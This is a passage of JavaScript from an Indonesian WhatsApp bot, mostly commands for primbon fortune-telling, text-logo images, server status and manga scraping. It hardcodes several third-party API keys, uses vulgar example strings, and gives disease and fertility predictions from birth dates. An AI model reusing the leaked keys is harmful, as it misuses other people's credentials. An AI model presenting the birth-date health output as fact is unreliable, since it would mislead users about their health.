  if (!m.text.includes('.')) return;
  if (!isPremium && global.db.data.users[sender].glimit < 20) return setReply('Limit kamu sudah habis, silahkan ketik .limit')
	const gtts = require( 'node-gtts')
	function tts(text, lang = 'id') {
	// console.log(lang, text)
	return new Promise((resolve, reject) => {
	try {
	let tts = gtts(lang)
	let filePath =  (1 * new Date) + '.mp3'
	tts.save(filePath, text, () => {
	resolve(fs.readFileSync(filePath))
	fs.unlinkSync(filePath)
	})
	} catch (e) { reject(e) }
	})
	}
	
	const defaultLang = 'id'
	
	
	let lang = args[0]
	let text = args.slice(1).join(' ')
	if ((args[0] || '').length !== 2) {
	lang = defaultLang
	text = args.join(' ')
	}
	if (!text && m.quoted?.text) text = m.quoted.text
	
	let ras
	try { ras = await tts(text, lang) }
	catch (e) {
	m.reply(e + '')
	text = args.join(' ')
	if (!text) setReply( `Use example ${prefix}${command} en hello world`)
	ras = await tts(text, defaultLang)
	} finally {
	if (ras) ehz.sendMedia(from, ras, m, {caption: "Nih"})
	//conn.sendFile(m.chat, res, 'tts.opus', null, m, true)
	}
	db.data.users[sender].glimit -= 20
	break


// ===================PRimbon====== //
case 'bisakah':{
  if (!m.text.includes('.')) return;
if (!isGroup) return m.reply('Kusus group')
const bisakah = body.slice(0)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😂˜„','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 😆™‚','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
ehz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://www.instagram.com/xyy_dy_coders`,}
}, text: '*Pertanyaan : '+bisakah+'*\n\n*Jawaban :* '+ keh }, { quoted: m })
}
break

    case "rvo": {

    quoted.msg.viewOnce = true
    await ehz.sendMessage(m.from, { forward: quoted }, { quoted: m })
}
break
    case 'hobbycek': case 'cekhobby':
const hobby = body.slice(0)
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
ehz.sendMessage(from, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: fkontak })
break
case 'cebelapaimutciaku': case 'seberapaimutsiaku':{
if (!isGroup) return m.reply('Kusus group')
const edgar = body.slice(0)
const nanya =['*79%*\n\nImut Banget Loh Kawai><','*15%*\n\nKamu imut kata mamakmu:v🗿','*30%*\n\nMene Ketehe Kok Tanya saya\nMinimal Mandi🗿','*28%*\n\nIya deh Cipaling Imut;)','*100%*\n\nPap imutnya dulu dong:v😘']
const pret = nanya[Math.floor(Math.random() * nanya.length)]
ehz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `dy_net`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://www.instagram.com/xyy_dy_coders`,}
}, text: '*Pertanyaan : '+edgar+'*\n\n*Jawaban :* '+ pret}, { quoted: m })
}
break
    
  case 'artinama': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz Dhoanx`)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Nama :* ${anu.message.nama}
∘ *Arti :* ${anu.message.arti}
∘ *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break	 
    
 // ===================================== //
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return setReply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Mimpi :* ${anu.message.mimpi}
• *Arti :* ${anu.message.arti}
• *Solusi :* ${anu.message.solusi}`
setReply(teks)
}
break
 case 'pasangan': {
if (!q) return setReply( `Example : ${prefix + command} dy|aeni`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
setReply(teks)
}
break   
case 'ramalancinta': case 'ramalcinta': {
if (!q) return setReply( `Example : ${prefix + command} dycoders, 28, 6, 2004, dy, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda.nama}
• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}
• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}
• *Catatan :*
${anu.message.catatan}`
setReply(teks)
}
break   
case 'kecocokannama': 
case 'cocoknama': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Life Path :* ${anu.message.life_path}
• *Destiny :* ${anu.message.destiny}
• *Destiny Desire :* ${anu.message.destiny_desire}
• *Personality :* ${anu.message.personality}
• *Persentase :* ${anu.message.persentase_kecocokan}`
setReply(teks)
}
break 
    case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
if (!q) return setReply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`
setReply(teks)
}
break
case 'jadiannikah': {
if (!q) return setReply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal Pernikahan :* ${anu.message.tanggal}
• *karakteristik :* ${anu.message.karakteristik}`
setReply(teks)
}
break
case 'sifatusaha': {
if (!q) return setReply( `Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Usaha :* ${anu.message.usaha}`
setReply(teks)
}
break
    case 'rejeki': 
case 'rezeki': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Rezeki :* ${anu.message.rejeki}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'pekerjaan':  {
if (!q) return setReply( `Example : ${prefix + command}  7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Pekerjaan :* ${anu.message.pekerjaan}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'ramalnasib': 
case 'nasib': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Angka Akar :* ${anu.message.angka_akar}
• *Sifat :* ${anu.message.sifat}
• *Elemen :* ${anu.message.elemen}
• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`
setReply(teks)
}
break 
case 'penyakit': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Sektor :* ${anu.message.sektor}
• *Elemen :* ${anu.message.elemesektorn}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'artitarot': 
case 'tarot': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Simbol Tarot :* ${anu.message.simbol_tarot}
• *Arti :* ${anu.message.arti}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'fengshui': {
if (!q) return setReply( `Example : ${prefix + command} dy, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama} 
• *Lahir :* ${anu.message.tahun_lahir}
• *Gender :* ${anu.message.jenis_kelamin}
• *Angka Kua :* ${anu.message.angka_kua}
• *Kelompok :* ${anu.message.kelompok}
• *Karakter :* ${anu.message.karakter}
• *Sektor Baik :* ${anu.message.sektor_baik}
• *Sektor Buruk :* ${anu.message.sektor_buruk}`
setReply(teks)
}
break
case 'haribaik': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
•™*Kala Tinantang :* ${anu.message.kala_tinantang}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'harisangar': 
case 'taliwangke': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'harisial': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Hari Naas :* ${anu.message.hari_naas}
• *Info :* ${anu.message.catatan}
• *Catatan :* ${anu.message.info}`
setReply(teks)
}
break
case 'harinaga': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Naga Hari :* ${anu.message.arah_naga_hari}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'arahrejeki': 
case 'arahrezeki': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Rezeki :* ${anu.message.arah_rejeki}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'peruntungan': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}
• *Hasil :* ${anu.message.result}
• *Catatan :* ${anu.message.catatan}`
}
break
case 'weton': 
case 'wetonjawa': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal :* ${anu.message.tanggal}
• *Jumlah Neptu :* ${anu.message.jumlah_neptu}
• *Watak Hari :* ${anu.message.watak_hari}
• *Naga Hari :* ${anu.message.naga_hari}
• *Jam Baik :* ${anu.message.jam_baik}
• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`
setReply(teks)
}
break
case 'karakter': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Garis Hidup :* ${anu.message.garis_hidup}`
setReply(teks)
}
break
case 'keberuntungan': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}`
setReply(teks)
}
break
case 'masasubur': {
if (!q) return setReply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
let teks = `
•  *Hasil :* ${anu.message.result}
•  *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
  case 'zodiak': 
case 'zodiac': {
if (!q) return setReply( `Example : ${prefix + command} 7 7 2005`)
let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(q)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Zodiak :* ${anu.message.zodiak}
∘ *Nomor :* ${anu.message.nomor_keberuntungan}
∘ *Aroma :* ${anu.message.aroma_keberuntungan}
∘ *Planet :* ${anu.message.planet_yang_mengitari}
∘ *Bunga :* ${anu.message.bunga_keberuntungan}
∘ *Warna :* ${anu.message.warna_keberuntungan} 
∘ *Batu :* ${anu.message.batu_keberuntungan}
∘ *Elemen :* ${anu.message.elemen_keberuntungan}
∘ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}
∘ *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
   

case 'wangy':
              if (!q) return setReply('query')
              let qq = q.toUpperCase()
              let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              setReply(awikwok)
              break
//========= MENU SKULL =========//

//========== INFO BOT ============//

 case 'ping':
            case 'botstatus':
            case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await ehz.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'STATUS SERVER',
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',
                            sourceUrl: '-',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'infogempa':{
            
let scrapy = require("node-scrapy")
const model = ['tr:nth-child(1) td']
fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg').then((res) => res.text()).then((body) => {
let result = scrapy.extract(body, model)
let waktu = result[1] || "Tidak ada data"
let lintang = result[2] || "Tidak ada data"
let bujur = result[3] || "Tidak ada data";
let magnitudo = result[4] || "Tidak ada data"
let kedalaman = result[5] || "Tidak ada data"
let lokasi = result[6] || "Tidak ada data"
const teks = `informasi gempa terbaru:\n\nWaktu: *${waktu}*\nBujur: *${bujur}*\nLintang: *${lintang}*\nMagnitudo: *${magnitudo}*\nKedalaman: *${kedalaman}*\nLokasi: *${lokasi}*`.trim()
setReply(teks)
})
}
break
case 'totalfitur':{ 
setReply(`_TOTAL FITUR BOT CASE SAAT INI ${totalFitur()} FITUR_`)
}
break
case 'runtime':{
setReply(`*dy_net Aktif* ${runtime(process.uptime())}`)
}
break
case 'owner': {
  if (!m.text.includes('.')) return;
const repf = await ehz.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
ehz.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Hii itu nomor owner ku jan spam yak:)`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
//========= SETTINGS ==========//
 
case 'setnamebot':
	if (!isOwner) return onlyOwner()
	setReply(`Berhasil mengubah nama bot ke ${q}`)
	fake = `${q}`
	break
case 'setbio':
{
if (!isOwner && !itsMe) return setReply("Khusus Owner")
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} sedang berak`)
await ehz.updateProfileStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'setppbot':
                if (!isOwner) return setReply(mess.owner)
                if (!quoted) return setReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return setReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return setReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                var medis = await ehz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ehz.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    setReply(mess.succes)
                } else {
                    var memeg = await ehz.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    setReply(mess.succes)
                }
                break

//======= MENU RANDOM =======
case 'bucinsertifikat':
		    case 'sertifikatbucin':
			case 'bucinserti':
				if (args.length == 0) return setReply(`Example: ${prefix + command} ehanz & angel\n bjir lah love you`)
				setReply(mess.wait)
				let kueri = args.join(" ")
                ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${api.Lol}&name=${kueri}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
case 'tololserti':
			case 'tololcert':
			case 'tololsertifikat':
			  if (!m.text.includes('.')) return;
			if (args.length == 0) return setReply(`Contoh: ${prefix + command} izmi Kontol`)
			setReply(mess.wait)
			let ytta = args.join(" ")
            ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${api.Lol}&name=${ytta}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
case 'pacarsertifikat':
			case 'pacarserti':
			  if (!m.text.includes('.')) return;
            if (args.length == 0) return setReply(`Usage: ${prefix + command} nama1|nama2`)
            setReply(mess.wait)
              let  get_args = args.join(" ").split("|")
              let  nik = get_args[0]
              let  prov = get_args[1]
			  let  titidnya = `Selamat yaa ${nik} ❤️ ${prov}`
            ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${api.Lol}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            break
case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
		  if (!m.text.includes('.')) return;
			if (args.length == 0) return setReply(`Example: ${prefix + command} Ehanz Pedo`)
            db.data.users[m.sender].limit -= 4 // -1 limit
			setReply(mess.wait)
			ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${api.Lol}&text1=${args[0]}&text2=${args[1]}`}, caption: `© dy_net\n\n Type: ${command}`})
			break
case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
		  if (!m.text.includes('.')) return;
			if (args.length == 0) return setReply(`Example: ${prefix + command} dy_netz`)
            db.data.users[m.sender].limit -= 2 // -1 limit
			setReply(mess.wait)
			ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${api.Lol}&text=${args}` }, caption: `© dy_net\n\n Type: ${command}\n\nText: ${args}`})
			break
case 'cyberspace':
            case 'mountain':
            case 'programming':
            case 'technology': {
            setReply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Wallpaper/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                ehz.sendMessage(m.chat, { image: { url: result}, caption: mess.succes }, { quoted: m })
            }
            break
case 'cecan': case 'cogan': case 'hacker': case 'pubg': case 'boneka':
  if (!m.text.includes('.')) return;
  if (!isPremium) return setReply('*khusus Premium*')
if (!isGroup) return onlyGroup()
setReply(mess.wait)
ehz.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/randomimage/${command}?apikey=${api.angel}` } })
break
case 'dycoders': case '@6285719898124': case '6285719898124':
let oah = 'KENAPA BAWA² OWNER KU'
setReply(oah)
break
case 'wattpad': {
if (!isGroup) return onlyGroup()
if (!q) return setReply(`Example : ${prefix + command} selingkuh`)
setReply(mess.wait)
let res = await getBuffer(`https://api.betabotz.eu.org/api/webzone/wattpad?query=${q}&apikey=9Ih3IPUv`)
let data = await res.Buffer()
            let teks = `Wattpad\n\n`
            for (let i of data.result){
teks += `*Judul* : ${i.judul}\n`
teks += `*Dibaca* : ${i.dibaca}×\n`
teks += `*Divote* : ${i.divote}×\n`
teks += `*Thumb* : ${i.thumb}\n`
teks += `*Link* : ${i.link}\n\n`
            }
setReply(teks)
            }
            break
            case 'komikulatest': {

				let res = await fetch(`https://rzky.my.id/api/anime/komiku/latest?apikey=HC-tsy5v7WU7K3JWeB`);

				let datas = await res.json();

				let teks = `*KOMIKU LATEST*\n\n`;

				for (let i of datas.result) {
					teks += `❏ *Title* : ${i.title}\n`;
					teks += `❏ *Chapter* : ${i.chapter.join(', ')}\n`;
					teks += `❏ *Image* : ${i.img}\n`;
					teks += `❏ *Link* : ${i.link}\n\n`;
				}
				setReply(teks);
			}
			break;
            case 'komikusearch': {

				if (!q) return ('Mau cari apa?');

				let res = await fetch(`https://rzky.my.id/api/anime/komiku/search?query=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
				let datas = await res.json();

				let teks = `*KOMIKU SEARCH*\n\n`;

				for (let i of datas.result) {
					teks += `❏ *Title* : ${i.title}\n`;
					teks += `❏ *Chapter* : ${i.chapter.awal} - ${i.chapter.akhir}\n`;
					teks += `❏ *Image* : ${i.img}\n`;
					teks += `❏ *Link* : ${i.link}\n\n`;
				}
				setReply(teks);
			}
			break;
			case 'komikudetail': {

				if (!q) return ('Mau cari apa?')

				if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply(`Example: ${prefix + command} https://komiku.id/manga/the-reincarnation-of-the-forbidden-archmage/ `)
				let res = await fetch(`https://rzky.my.id/api/anime/komiku/detail?url=${q}&apikey=HC-tsy5v7WU7K3JWeB`);
				let data = await res.json();

				let teks = `*KOMIKU DETAIL*\n\n`;

				let animeResult = data.result;

				teks += `❏ *Title* : ${animeResult.title}\n`;
				teks += `❏ *Image* : ${animeResult.img}\n`;

				// Metadata
				let metadata = animeResult.metadata;
				teks += `❏ *Indonesian Title* : ${metadata.judul_indonesia}\n`;
				teks += `❏ *Comic Type* : ${metadata.jenis_komik}\n`;
				teks += `❏ *Story Concept* : ${metadata.konsep_cerita}\n`;
				teks += `❏ *Artists* : ${metadata.komikus}\n`;
				teks += `❏ *Status* : ${metadata.status}\n`;
